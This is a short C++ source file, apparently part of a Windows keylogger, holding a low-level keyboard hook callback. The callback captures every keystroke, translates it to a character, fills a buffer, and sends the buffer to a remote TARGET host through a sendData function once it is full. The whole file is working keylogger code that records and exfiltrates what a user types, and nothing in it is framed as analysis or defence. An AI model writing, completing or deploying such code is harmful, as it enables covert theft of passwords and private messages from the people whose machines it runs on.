#include "Network.h"
#include "KeyLogger.h"
#include <iostream>

// them cac ham xu li keylogger vao day

LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {  // do not process key if < 0, as specified by documentation
		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);  
		if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
			GetKeyState(VK_SHIFT);  // needed to update keyboard state
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			
			unsigned short translatedChar[2];
			
			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
				char key1 = static_cast<char>(translatedChar[0]);
				keystrokeBuffer += key1;
				if (keystrokeBuffer.size() >= MAX_BUFFER) {
					std::cout << keystrokeBuffer << std::endl;
					int success = sendData(connectionId, packetNumber, TARGET.c_str(), keystrokeBuffer.c_str());
					keystrokeBuffer = "";
					std::cout << success << std::endl << std::endl;
					packetNumber++;
					if (packetNumber > 999) {
						packetNumber = 0;
					}
				}
			}
		}
	}
	
	return CallNextHookEx(nullptr, nCode, wParam, lParam); // pass the keypress event to the next hook in the system chain hook
}